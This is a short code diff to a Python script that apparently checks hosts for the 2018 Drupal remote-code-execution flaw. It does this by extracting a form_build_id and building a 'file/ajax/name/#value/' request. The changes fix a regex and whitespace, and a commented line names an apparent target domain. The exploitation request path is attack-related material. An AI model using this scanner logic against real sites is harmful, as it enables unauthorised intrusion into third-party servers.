@@ -53,8 +53,7 @@ def isPwnAble_2018(host, version, headers):
                               headers=headers, timeout=1)
         except:
             return False
-        m = re.search(r'<input type="hidden" name="form_build_id"\
-                     value="([^"]+)"', r.text)
+        m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)"', r.text)
         if m:
             found = m.group(1)
             get_params = {'q': 'file/ajax/name/#value/' + found}
@@ -108,7 +107,7 @@ def isVulnerable(lines):
             f.write("%s === Redirected ===  || %s  \n"
                     % (host.encode("utf-8"), formValid))
 
-                  
+
 if __name__ == "__main__":
     # lines = 'argusme.com|7.44'
     # version = ''
